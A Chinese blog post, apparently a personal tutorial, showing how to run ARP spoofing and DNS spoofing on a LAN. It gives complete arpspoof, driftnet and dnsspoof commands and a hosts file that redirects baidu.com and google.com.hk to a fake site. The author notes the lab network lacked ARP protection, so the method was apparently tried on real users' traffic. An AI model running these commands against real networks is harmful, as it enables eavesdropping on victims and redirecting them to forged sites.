---
layout: single
author_profile: true
comments: true
title: arpspoof and dnsspoof
category: cybersecurity
tags: [DNS, 网络安全]
---

最近搞了一个监听神器，尽管使用了网卡混杂模式，不过监听到的几乎全是本地流量，
为了获取更多有用的数据，搞一下中间人攻击，最基本的就是arpspoof + IP转发，这样就可以获得局域网内任何人的上网流量，
难得的是实验室没有做ARP防护，给arpspoof一个大行其道的机会。

# arpspoof

1. 实战环境

* 攻击者(kali linux)：10.10.10.1
* 攻击目标：10.10.10.2
* 默认网关：10.10.10.254

2. 攻击步骤

首先在本地开启IP转发，否则很容易被发觉。 

> echo 1 >> /proc/sys/net/ipv4/ip_forward

用man arpspoof查看参数详细说明  
首先跟10.10.10.2说我是网关10.10.10.254 

> arpspoof -i eth0 -t 10.10.10.2 10.10.10.254

然后跟网关10.10.10.254说我是10.10.10.2，完成双向欺骗

> arpspoof -i eth0 -t 10.10.10.254 10.10.10.2

上面两条arpspoof指令可以用下面一个指令完成

> arpspoof -i eth0 -t 10.10.10.2 -r 10.10.10.254

最后利用[driftnet](http://www.ex-parrot.com/~chris/driftnet/)工具捕获并友好地显示10.10.10.2在网上浏览的图片

> driftnet -i eth0

[REF](http://www.freebuf.com/articles/system/5157.html)


# dnsspoof

### 1. 攻击环境

* 攻击者(kali linux)：10.10.10.1
* 攻击目标：10.10.10.2
* 默认网关：10.10.10.254
* DNS服务器: 8.8.8.8
* 伪造网站: 10.10.10.3

### 2. 攻击步骤

先进行arp欺骗，以中转攻击目标的所有上网流量

> echo 1 >> /proc/sys/net/ipv4/ip_forward  
  arpspoof -i eth0 -t 10.10.10.2 10.10.10.254  
  arpspoof -i eth0 -t 10.10.10.254 10.10.10.2  


按照[hosts文件格式](http://linux.die.net/man/5/hosts)，创建一个dnsspoof.hosts文件,
当受害者请求该文件中的域名解析时，我们就返回给他一个伪造的IP地址，让其访问我们伪造的网站。

> cat dnsspoof.hosts  
> 10.10.10.3     *.baidu.com  
> 10.10.10.3     *.google.com.hk  

执行dnsspoof, -f指定hosts文件，host 10.10.10.2 and udp port 53 遵从tcpdump流量过滤规则

> dnsspoof -i eth0 -f dnsspoof.hosts host 10.10.10.2 and udp port 53

这样当攻击目标10.10.10.2访问baidu.com或者google.com.hk时，受害者访问的实际上是10.10.10.3指定的网站。

通过抓包分析，dnsspoof的原理如下  

> 由于DNS协议使用是传输层协议是UDP协议, 
  这样无需像TCP那样建立连接就可以轻松的伪造应答包，包括源IP.
  10.10.10.2发送DNS 查询包问DNS服务器www.baidu.com的IP地址是多少？
  10.10.10.1装作DNS服务器（伪造IP）向攻击目标发送一个DNS响应包说www.baidu.com的IP地址是10.10.10.3。


[REF](https://tournasdimitrios1.wordpress.com/2011/03/03/dns-spoofing-with-dnsspoof-on-linux/)
